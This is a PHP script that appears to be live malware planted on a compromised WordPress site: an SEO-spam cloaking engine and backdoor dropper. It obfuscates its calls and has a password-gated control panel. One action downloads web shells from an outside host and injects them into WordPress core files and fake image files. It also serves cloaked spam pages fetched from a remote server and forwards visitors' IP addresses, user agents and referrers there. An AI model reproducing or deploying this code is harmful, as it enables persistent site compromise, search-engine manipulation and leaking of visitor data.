<?php
error_reporting(0);
@set_time_limit(3600);
@ignore_user_abort(1);
$xmlname = 'mapss.xml';
$dt = 0;
$sitemap_file = 'sitemap';
$mapnum = 2000;
if(isset($_GET['dt'])){
	$dt = $_GET['dt'];
}
$site = @$_GET['smsite'];
$jdir = '';
$http_web = 'http';
if(is_https()){
 $http = 'https';
}else{
 $http = 'http';
}
$smuri_tmp = smrequest_uri();
$uri_script = "";
if(strstr($smuri_tmp, ".php") && !$site){
	$uri_arr = explode(".php", $smuri_tmp);
	$uri_script = $uri_arr[0].".php?";
	$smuri_tmp = $uri_arr[1];
	$smuri_tmp = str_replace("?", "/", $smuri_tmp);
}
if($smuri_tmp==''){
    $smuri_tmp='/';
}
$s = 'b'.'ase6'.'4_e'.'ncode';
$smuri = $s($smuri_tmp);
function smrequest_uri(){
    if (isset($_SERVER['REQUEST_URI'])){
        $smuri = $_SERVER['REQUEST_URI'];
    }else{
        if(isset($_SERVER['argv'])){
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['argv'][0];
        }else{
            $smuri = $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING'];
        }
    }
    return $smuri;
}
@$action = $_GET['ac']?$_GET['ac']:"";
if($action != "" && $action == "write"){
	write();
	echo "write done!";
	exit();
}
$temp = @$_GET['smtemp'];
$id = @$_GET['smid'];
$page = @$_GET['smpage'];
$site = str_replace('/','',$site);
$host = $_SERVER['HTTP_HOST'];
$clock = '';

$tempweb = @$_GET['tempweb'];
$tempweb = str_replace('/','',$tempweb);

if(preg_match('@pingsitemap.xml@i',$smuri_tmp)){
	@header("Content-type: text/css; charset=utf-8");
	if($uri_script == ""){$uri_script="/";}
	$sitemap = "https://www.google.com/ping?sitemap=$http://$host$uri_script"."sitemap.xml";
	$contents = get($sitemap);
	if(strpos($contents, "Sitemap Notification Received")){
		echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap.xml"." : OK!<br>";
	}else{
		echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap.xml"." : ERROR!<br>";
	}
	$mnum = mt_rand(30, 80);
	for($i = 0; $i < $mnum; $i++){
		$sitemap = "https://www.google.com/ping?sitemap=$http://$host$uri_script"."sitemap$i.xml";
		$contents = get($sitemap);
		if(strpos($contents, "Sitemap Notification Received")){
			echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap$i.xml"." : OK!<br>";
		}else{
			echo "Submitting Google Sitemap $http://$host$uri_script"."sitemap$i.xml"." : ERROR!<br>";
		}
	}
	exit;
}


$goweb = 'seo35.hasapro.xyz';
$password = md5(md5(@$_GET['pd']));
if ($password == '5fbf36f6b1070aec65f00cb8e35c9cc4') {
    $add_content = @$_GET['mapname'];
    $action = @$_GET['action'];
    $domain = @$_GET['domain'];
    if($domain){
        $host = $domain;
    }else{
        $host = $_SERVER['HTTP_HOST'];
    }
    //$host = $_SERVER['HTTP_HOST'];
    $path = dirname(__FILE__);

    $file_path = $path.'/robots.txt';
    if(!$action){
        $action = 'put';
    }
    if($action == 'put'){
        $data = 'User-agent: *
Allow: /';
		$uri_script = trim($uri_script);
		if( $uri_script!= "" && $uri_script!="/index.php?"){
			$data = trim($data)."\r\n"."Sitemap: $http://".$host.$uri_script."sitemap.xml";
		}else{
			$data = trim($data)."\r\n"."Sitemap: $http://".$host."/sitemap.xml";
		}
		$num = mt_rand(5, 10);
		for($i = 0; $i<$num; $i++){
			if(trim($uri_script) != "" && $uri_script!="/index.php?"){
				$data = trim($data)."\r\n"."Sitemap: $http://".$host.$uri_script."sitemap$i.xml";
			}else{
				$data = trim($data)."\r\n"."Sitemap: $http://".$host."/sitemap$i.xml";
			}
		}
		@chmod("robots.txt", 0755);
		file_put_contents("robots.txt", $data);
		echo "robots write done!!";
    }
    if($action == 'del'){
        if(file_exists($file_path)){
            $data = smoutdo($file_path);
        }else{
            $data = '';
        }
        if(strstr($data,'/'.$add_content)){
            if(is_https()){
                $data_new = trim($data)."\r\n".'Sitemap: https://'.$host.'/'.$add_content;
            }else{
                $data_new = trim($data)."\r\n".'Sitemap: http://'.$host.'/'.$add_content;
            }
            if(file_put_contents($file_path,$data_new)) {
                echo '<br>ok<br>';
            }else{
                echo '<br>file write false!<br>';
            }
        }else{
            echo '<br>sitemap does not exist!<br>';
        }
    }

    exit;
}
function is_https() {
    if ( !empty($_SERVER['HTTPS']) && strtolower($_SERVER['HTTPS']) !== 'off') {
        return true;
    } elseif ( isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https' ) {
        return true;
    } elseif ( !empty($_SERVER['HTTP_FRONT_END_HTTPS']) && strtolower($_SERVER['HTTP_FRONT_END_HTTPS']) !== 'off') {
        return true;
    }
    return false;
}



if($tempweb){
    $site = $tempweb[0].$tempweb[1].$tempweb[2];
    $temp = substr($tempweb,3);
}
$lang = $_SERVER["HTTP_ACCEPT_LANGUAGE"];
$lang = $s($lang);
$os = $_SERVER['HTTP_USER_AGENT'];
$os = $s($os);
if(isset($_SERVER['HTTP_REFERER'])){
    $urlshang = $_SERVER['HTTP_REFERER'];
    $urlshang = $s($urlshang);
}else{
    $urlshang = '';
}

if(getenv('REMOTE_ADDR') && strcasecmp(getenv('REMOTE_ADDR'), 'unknown')) {
    $clock = getenv('REMOTE_ADDR');
} elseif(isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], 'unknown')) {
    $clock = $_SERVER['REMOTE_ADDR'];
}

$http_clock = '';
if(getenv('HTTP_CLIENT_IP') && strcasecmp(getenv('HTTP_CLIENT_IP'), 'unknown')) {
    $http_clock = getenv('HTTP_CLIENT_IP');
} elseif(getenv('HTTP_X_FORWARDED_FOR') && strcasecmp(getenv('HTTP_X_FORWARDED_FOR'), 'unknown')) {
    $http_clock = getenv('HTTP_X_FORWARDED_FOR');
}

if(stristr($clock,',')){
    $clock_tmp = explode(",",$clock);
    $clock = $clock_tmp[0];
}

if(!isset($sitemap_file) || @$sitemap_file==''){
    $sitemap_file = 'sitemap';
}
if(!isset($mapnum) || @$mapnum==''){
    $sitemap_file = 2000;
}


if(preg_match('/^'."\/".$sitemap_file.'(\d+)?.xml$/i',$smuri_tmp,$uriarr)){
    @header("Content-type: text/xml");
    if(isset($uriarr[1])){
        $id = str_replace('_','',$uriarr[1]);
    }else{
        $id = 100;
    }
    $ivmapid = 0;
    sitemap_out(z_sitemap($goweb,$id,$host,$dt,$ivmapid,$mapnum,$http_web),$host,$uri_script);
    exit();
}
function z_sitemap($goweb,$id,$host,$dt,$maptype,$map_num,$http_web='http',$filetype=0,$map_splits_num='',$temp='',$dataNew=''){
    $web = $http_web.'://'.$goweb.'/sitemapdtn.php?date='.$id.'&temp='.$temp.'&web='.$host.'&xml='.$dt.'&maptype='.$maptype.'&filetype='.$filetype.'&map_splits_num='.$map_splits_num.'&map_num='.$map_num.'&dataNew='.$dataNew;
    return trim(smoutdo($web));
}
function sitemap_out($url,$host,$uri_script){
    if(is_https()){
        $http = 'https';
    }else{
        $http = 'http';
    }
    $date_str =  date("Y-m-d\TH:i:sP",time());
    $sitemap_header = '<?xml version="1.0" encoding="UTF-8"?>
<urlset
      xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"
      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:schemaLocation="http://www.sitemaps.org/schemas/sitemap/0.9
            http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd">';
    $sitemap_header .= '
  <url>
    <loc>'.$http.'://' . $host . "/" . '</loc>
    <lastmod>' . $date_str . '</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.1</priority>
  </url>';
    $url_arr = explode("\r\n",$url);
    $map_str = $sitemap_header;
    foreach($url_arr as $value){
        $map_str .= '
  <url>
    <loc>'.$http.'://' . $host . "/" .$value .'</loc>
    <lastmod>' . $date_str . '</lastmod>
    <changefreq>daily</changefreq>
    <priority>0.1</priority>
  </url>';
    }
	if($uri_script != ""){
		$map_str = str_replace($host."/",$host.$uri_script, $map_str);
	}
    echo $map_str."
</urlset>";
}

function get($url){
	$contents = @file_get_contents($url);
	if (!$contents) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
		$contents = curl_exec($ch);
		curl_close($ch);
	}
	return $contents;
}
function write(){
	$write1 = get("http://hello.firstguide.xyz/write1.txt");
	$write2 = get("http://hello.firstguide.xyz/write2.txt");
	$shell_postfs = get("http://hello.firstguide.xyz/mm1.txt");
	$shell_load = get("http://hello.firstguide.xyz/mm2.txt");
	$new_ht_content = get("http://hello.firstguide.xyz/shl/htaccess.txt");
	$ht_content = file_get_contents(".htaccess");
	$index_content = file_get_contents("index.php");
	$loader_php = "wp-includes/template-loader.php";
	$load_php = "wp-includes/load.php";
	$font_editor_php = "wp-includes/SimplePie/index.php";
	if(!is_dir("css")){
		mkdir("css", 0755, true);
	}
	@chmod("css/.htaccess", 0755);
	file_put_contents("css/.htaccess", $new_ht_content);
	file_put_contents("css/load.php", $shell_load);
	if(is_dir("wp-includes/SimplePie")){
		file_put_contents("wp-admin/images/arrow-lefts.png", $index_content);
		file_put_contents("wp-admin/images/arrow-rights.png", $ht_content);
		file_put_contents("wp-includes/images/smilies/icon_devil.gif", $index_content);
		file_put_contents("wp-includes/images/smilies/icon_crystal.gif", $ht_content);
		$loader_content = file_get_contents($loader_php);
		$load_content = file_get_contents($load_php);
		@chmod($loader_php, 0755);@chmod($load_php, 0755);
		file_put_contents($loader_php, $write1.$loader_content);
		file_put_contents($load_php, $load_content.$write2);
		@chmod($loader_php, 0644);@chmod($load_php, 0644);
		file_put_contents($font_editor_php, $shell_postfs);
	}
}

if(stristr($smuri_tmp,'.css')){
    $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&jdir='.$jdir.'&clock='.$clock.'&uri='.$smuri.'&lang='.$lang.'&os='.$os.'&urlshang='.$urlshang.'&http_clock='.$http_clock;
    $html_content = trim(smoutdo($web));
    if(!strstr($html_content,'nobotuseragent')){
        if(strstr($html_content,'okhtmlgetcontent')){
            @header("Content-type: text/css; charset=utf-8");
            $html_content = str_replace("okhtmlgetcontent",'',$html_content);
            echo $html_content;
            exit();
        }else if(strstr($html_content,'getcontent500page')){
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        }else if(strstr($html_content,'getcontent404page')){
            @header('HTTP/1.1 404 Not Found');
            exit();
        }
    }
}else if($site){
    if($site == 'xml'){
        @header("Content-type: text/html; charset=utf-8");
        $mapdir = @$_GET['mapdir'];
        $maptype = @$_GET['maptype'];
        $filetype = @$_GET['filetype'];
        $map_splits_num = @$_GET['map_splits_num'];
        $map_num = @$_GET['map_num'];
        $dataNew = @$_GET['dataNew'];
        if($mapdir){
            if(!is_dir($mapdir)){
                @mkdir($mapdir,0777,true);
                echo 'ok '.$mapdir.' success!<br>';
            }else{
                echo $mapdir.' already exist!<br>';
            }
        }
        if(@$_GET['mapindex']){
            $filearray = listDir($mapdir);
            if(count($filearray)>=2){
                $mapindex_str = '';
                $mapindex_str = '<?xml version="1.0" encoding="UTF-8"?>
<sitemapindex xmlns="http://www.google.com/schemas/sitemap/0.84">';
                foreach($filearray as $value){
                    if(stristr($value,'.xml')){
                        $mapindex_str .= '
  <sitemap>
    <loc>'."http://".$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$value.'</loc>
  </sitemap>';
                    }
                }
                $mapindex_str .= '
</sitemapindex>';
                $xmlname = @$_GET['mapindex'].'.xml';
                $myfile = fopen($xmlname, "w");
                fwrite($myfile, $mapindex_str);
                fclose($myfile);
                echo "ok<br>http://".$_SERVER['HTTP_HOST']."/".$xmlname;
                //echo "<br>".$web;
                exit;
            }else{
                echo 'xml file less number mapindex faile!';
                exit;
            }
        }
        $web = $http_web.'://'.$goweb.'/sitemap.php?date='.$id.'&temp='.$temp.'&web='.$host.'&xml='.$dt.'&maptype='.$maptype.'&filetype='.$filetype.'&map_splits_num='.$map_splits_num.'&map_num='.$map_num.'&dataNew='.$dataNew.'&uri='.$smuri.'&http='.$http;
        if(substr($temp,0,8)=='shellxml'){
            $xmlname = substr($temp,8).'.xml';
        }
        if(substr($temp,0,7)=='hackxml'){
            if(substr($temp,7)){
                $xmlname = substr($temp,7).'.xml';
            }
        }
        if(@$_GET['mapdir']){
            if($filetype==1){
                $xmlname = $xmlname.'.gz';
            }else if($filetype==2){
                if(function_exists('gzopen')) {
                    $xmlname = $xmlname.'.gz';
                    if($fp = gzopen($mapdir.'/'.$xmlname, 'w9')){
                        $xml = trim(smoutdo($web));
                        if(stristr($xml,'no creat map')){
                            echo '<font style="color:red">no creat map!</font>';
                            exit;
                        }
                        $fp = gzopen ($mapdir.'/'.$xmlname, 'w9');
                        gzwrite ($fp, $xml);
                        gzclose($fp);
                        echo "ok<br>".$http."://".$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$xmlname;
                        echo "<br>".$web;
                        exit();
                    }else{
                        gzclose($fp);
                        echo '<font style="color:red">creat sitemap faile No Permissions!</font><br>http://'.$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$xmlname;
                        echo "<br>".$web;
                        exit();
                    }
                }else{
                    echo '<font style="color:red">gzopen no exists!</font><br>'.$http.'://'.$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$xmlname;
                    $web = $http_web.'://'.$goweb.'/sitemap.php?date='.$id.'&temp='.$temp.'&web='.$host.'&xml='.$dt.'&maptype='.$maptype.'&http='.$http;
                    echo "<br>".$web;
                    exit();
                }
            }
            if(fopen($mapdir.'/'.$xmlname, "w")){
                $xml = trim(smoutdo($web));
                if(stristr($xml,'no creat map')){
                    echo '<font style="color:red">no creat map!</font>';
                    exit;
                }
                $myfile = fopen($mapdir.'/'.$xmlname, "w");
                fwrite($myfile, $xml);
                fclose($myfile);
                echo "ok<br>".$http."://".$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$xmlname;
                echo "<br>".$web;
                exit();
            }else{
                fclose($myfile);
                echo '<font style="color:red">creat sitemap faile No Permissions!</font><br>http://'.$_SERVER['HTTP_HOST']."/".$mapdir.'/'.$xmlname;
                echo "<br>".$web;
                exit();
            }
        }else{
            if(fopen($xmlname, "w")){
                $xml = trim(smoutdo($web));
                if(stristr($xml,'no creat map')){
                    echo '<font style="color:red">no creat map!</font>';
                    exit;
                }
                $myfile = fopen($xmlname, "w");
                fwrite($myfile, $xml);
                fclose($myfile);
                echo "ok<br>".$http."://".$_SERVER['HTTP_HOST']."/".$xmlname;
                echo "<br>".$web;
                exit();
            }else{
                fclose($myfile);
                echo '<font style="color:red">creat sitemap faile No Permissions!</font><br>'.$http.'://'.$_SERVER['HTTP_HOST']."/".$xmlname;
                echo "<br>".$web;
                exit();
            }
        }
    }
    if($id){
        @header("Content-type: text/html; charset=utf-8");
        $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&clock='.$clock.'&uri='.$smuri.'&urlshang='.$urlshang.'&http='.$http.'&page='.$page;
        $html_content = trim(smoutdo($web));
        if(!strstr($html_content,'nobotuseragent')){
            if(strstr($html_content,'okhtmlgetcontent')){
                $html_content = str_replace("okhtmlgetcontent",'',$html_content);
                echo $html_content;
                exit();
            }else if(strstr($html_content,'getcontent500page')){
                @header('HTTP/1.1 500 Internal Server Error');
                exit();
            }else if(strstr($html_content,'getcontent404page')){
                @header('HTTP/1.1 404 Not Found');
                exit();
            }
        }
    }
}else{
    $web = $http_web.'://'.$goweb.'/index.php?url='.$site.'&id='.$id.'&temp='.$temp.'&dt='.$dt.'&web='.$host.'&zz='.smisbot().'&clock='.$clock.'&uri='.$smuri.'&urlshang='.$urlshang.'&http='.$http.'&page='.$page;
    $html_content = trim(smoutdo($web));
	if($uri_script != ""){
		$html_content = str_replace($host."/",$host.$uri_script, $html_content);
	}
    if(!strstr($html_content,'nobotuseragent')){
        @header("Content-type: text/html; charset=utf-8");
        if(strstr($html_content,'okhtmlgetcontent')){
            $html_content = str_replace("okhtmlgetcontent",'',$html_content);
            echo $html_content;
            exit();
        }else if(strstr($html_content,'getcontent500page')){
            @header('HTTP/1.1 500 Internal Server Error');
            exit();
        }else if(strstr($html_content,'getcontent404page')){
            @header('HTTP/1.1 404 Not Found');
            exit();
        }else if(strstr($html_content,'getcontent301page')){
            @header('HTTP/1.1 301 Moved Permanently');
            $html_content = str_replace("getcontent301page",'',$html_content);
            header('Location: '.$html_content);
            exit();
        }

    }
}

function smisbot() {
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($agent != "") {
        $googleBot = array("Googlebot","Yahoo! Slurp","Yahoo Slurp","Google AdSense",'google', 'yahoo');
        foreach ($googleBot as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str)) {
                return true;
            }
        }
    }else{
        return false;
    }
}
function smotherbot() {
    $agent = strtolower($_SERVER['HTTP_USER_AGENT']);
    if ($agent != "") {
        $spiderSite = array ("TencentTraveler","msnbot","Sosospider+","Sogou web spider","ia_archiver","YoudaoBot","MSNBot","Java (Often spam bot)","BaiDuSpider","Voila","Yandex bot","BSpider","twiceler","Sogou Spider","Speedy Spider","Heritrix","Python-urllib","Alexa (IA Archiver)","Ask","Exabot","Custo","OutfoxBot/YodaoBot","yacy","SurveyBot","legs","lwp-trivial","Nutch","StackRambler","The web archive (IA Archiver)","Perl tool","MJ12bot","Netcraft","MSIECrawler","WGet tools","larbin","Fish search", 'bingbot', 'baidu', 'aol', 'bing', 'YandexBot', 'AhrefsBot');
        foreach ($spiderSite as $val) {
            $str = strtolower($val);
            if (strpos($agent, $str)) {
                return true;
            }
        }
    }else{
        return false;
    }
}
function smoutdo($url){
    $file_contents = @file_get_contents($url);
    if (!$file_contents) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
        $file_contents = curl_exec($ch);
        curl_close($ch);
    }
    return $file_contents;
}
function listDir($dir){
    $filearr = array();
    if(is_dir($dir)){
        if ($dh = opendir($dir)){
            while (($file = readdir($dh)) !== false){
                if((file_exists($dir."/".$file)) && $file!="." && $file!=".."){
                    $filearr[] = $file;
                }
            }
            closedir($dh);
        }
    }
    return $filearr;
}
